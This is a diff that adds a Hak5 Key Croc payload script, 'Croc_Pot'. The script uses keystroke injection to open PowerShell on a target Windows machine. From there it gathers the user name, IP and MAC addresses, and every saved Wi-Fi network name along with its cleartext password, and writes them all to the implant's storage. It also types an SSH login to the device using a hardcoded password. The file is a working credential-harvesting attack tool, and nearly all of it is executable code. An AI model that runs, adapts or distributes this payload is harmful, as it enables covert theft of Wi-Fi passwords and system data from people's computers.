@@ -1,0 +1,66 @@
+# Title:         Croc_Pot Payload
+# Description:   Start Croc_pot.sh bash script automatically, scan takes about 30-40 sec to start because of OS detection
+#                This will collect some data like (ip address, current user name, pc host name, ssid and passwd, mac address)
+#                save to tools/Croc_pot folder
+# Author:        Spywill
+# Version:       1.1
+# Category:      Key Croc
+#
+#
+MATCH crocpot
+#
+CROC_PW=hak5croc
+PC_PW=LINUX
+echo "${CROC_PW}" > /tmp/CPW.txt
+#
+CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
+echo > ${CROC_OS}
+rm /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt
+ATTACKMODE RNDIS_ETHERNET
+LED ATTACK
+GET TARGET_OS
+GET TARGET_IP 
+GET HOST_IP
+GET TARGET_HOSTNAME
+LED R
+ATTACKMODE HID STORAGE
+sleep 1
+Q GUI r
+sleep 1
+Q STRING "powershell"
+Q ENTER
+sleep 5
+Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+Q ENTER
+sleep 1
+Q STRING "\$env:UserName | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+Q ENTER
+sleep 1
+Q STRING "Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=\$true | Select-Object -ExpandProperty IPAddress | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+Q ENTER
+sleep 1
+Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+Q ENTER
+sleep 2
+Q STRING "wmic nic where PhysicalAdapter=True get MACAddress,Name | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\Croc_OS_Target.txt\" -noclobber -append"
+Q ENTER
+sleep 3
+Q STRING "[System.Net.Dns]::GetHostAddresses(\"shark.lan\")[0].IPAddressToString | Format-Table -AutoSize | out-file -encoding UTF8 \"\$Croc\tools\Croc_Pot\shark_ip.txt\" -noclobber -append"
+Q ENTER
+sleep 3           
+ATTACKMODE HID
+sleep 1
+Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+Q ENTER
+sleep 2
+Q STRING "${CROC_PW}"
+Q ENTER
+sleep 2
+echo "$TARGET_OS" >> ${CROC_OS}
+echo "$TARGET_IP" >> ${CROC_OS}
+echo "$TARGET_HOSTNAME" >> ${CROC_OS}
+echo "$HOST_IP" >> ${CROC_OS}
+$(sed -i 's/\r//g' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+$(sed -i '0,/./s/^.//' /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt /root/udisk/tools/Croc_Pot/shark_ip.txt)
+Q STRING "/root/udisk/tools/Croc_Pot.sh"
+Q ENTER
